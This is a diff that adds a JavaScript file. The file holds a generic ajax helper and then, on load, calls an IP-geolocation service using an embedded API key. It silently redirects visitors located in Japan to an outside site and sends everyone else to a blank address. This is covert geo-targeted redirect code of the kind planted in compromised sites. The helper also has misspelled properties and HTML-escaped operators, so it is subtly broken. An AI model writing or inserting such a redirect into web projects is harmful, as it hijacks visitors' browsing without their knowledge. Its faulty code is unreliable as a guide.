@@ -1,0 +1,71 @@
+function ajax(options){
+    options = options ||{};
+    options.type=(options.type || "GET").toUpperCase();
+    options.dataType=options.dataType || "json";
+
+    var params=formatParams(options.data);
+
+    var xhr;
+    if(window.XMLHttpRequest){
+        xhr=new XMLHttpRequest();
+    }else if(window.ActiveObject){
+        xhr=new ActiveXobject('Microsoft.XMLHTTP');
+    }
+
+    if(options.type=="GET"){
+        xhr.open("GET",options.url,true);
+        xhr.send(null);
+    }else if(options.type=="POST"){
+        xhr.open("post",options.url,true);
+        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        xhr.send(params);
+    }
+
+    setTimeout(function(){
+        if(xhr.readySate!=4){
+            xhr.abort();
+        }
+    },options.timeout)
+    xhr.onreadystatechange=function(){
+        if(xhr.readyState==4){
+            var status=xhr.status;
+            if(status&gt;=200&amp;&amp; status&lt;300 || status==304){
+              options.success&amp;&amp;options.success(xhr.responseText,xhr.responseXML);
+            }else{
+                options.error&amp;&amp;options.error(status);
+            }
+        }
+    }
+}
+function formatParams(data){
+    var arr=[];
+    for(var name in data){
+        arr.push(encodeURIComponent(name)+"="+encodeURIComponent(data[name]));
+    }
+    arr.push(("v="+Math.random()).replace(".",""));
+    return arr.join("&amp;");
+
+}
+ajax({
+    url:"https://pro.ip-api.com/json?key=FMjb5N6z7rcJ8yt",
+    type:'get',
+    dataType:'json',
+    timeout:10000,
+    contentType:"application/json",
+   success:function(data){
+        var location = JSON.parse(data);
+        if (location.countryCode === "JP") { 
+            window.location.href = "https://www.uucopy.com/";
+        }
+        else{
+
+           window.location.href="";
+            
+        }
+        
+console.log(JSON.parse(data));
+    },
+    error:function(e){
+        console.log(e);
+    }
+})
